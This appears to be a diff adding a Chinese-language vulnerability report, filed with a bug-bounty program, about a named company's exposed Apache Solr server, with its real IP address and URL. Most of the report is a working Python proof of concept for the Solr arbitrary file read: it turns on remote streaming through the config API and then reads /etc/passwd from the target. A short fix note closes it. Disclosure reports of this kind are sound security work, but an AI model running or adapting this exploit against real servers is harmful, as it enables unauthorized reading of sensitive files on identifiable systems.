@@ -1,0 +1,41 @@
+厂商名称：江苏车行天下网络科技有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在敏感文件泄露
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：Apache Solr <= 8.8.1任意文件读取漏洞
+漏洞等级：高危
+漏洞url：http://www.ejyfile.com:8983 http://ejyfile.com:8983
+网站名称：江苏车行天下网络科技有限公司
+网站ip：47.110.132.31
+所属地区：南京市秦淮区永丰大道12号首屏科技研发综合办公楼1幢8楼801室
+漏洞描述：Apache Solr存在任意文件读取,漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件
+公司业务：网络工程开发、设计、施工；企业营销策划；企业形象策划；企业管理咨询；会务服务； 展览展示服务；票务代理；第一类增值电信业务中的在线数据处理与交易代理业务；第二类增值电信业务中的信息服务业务；计算机软硬件、电子设备开发、技术咨询、技术服务、销售； 通讯工程； 平面设计； 网页设计； 电子设备、计算机安装； 计算机系统集成；设计、制作、代理、发布国内各类广告；食品（须取得许可或批准后方可经营）、文体用品、日用百货销售。（依法须经批准的项目，经相关部门批准后方可开展经营活动）
+复现步骤：
+# -*- coding: utf-8 -*-
+import requests
+
+host = "http://http://47.110.132.31:8983"
+if host[-1] == '/':
+    host = host[:-1]
+
+
+def poc(host):
+    url = host + '/solr/admin/cores?indexInfo=false&wt=json'
+    core_data = requests.get(url, timeout=3).json()
+    if core_data['status']:
+        core = list(core_data['status'].keys())[0]
+        jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
+        requests.post(url=host + "/solr/%s/config" % core, json=jsonp_data)
+
+        result_data = requests.post(url=host + '/solr/%s/debug/dump?param=ContentStreams' % core,
+                                    data={"stream.url": "file:///etc/passwd"}).json()
+        if result_data['streams']:
+            print(result_data['streams'][0]['stream'])
+    else:
+        exit("不存在此漏洞")
+
+
+poc(host)
+修复方案：由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动，若需要在公网中使用，需要限制访问ip 
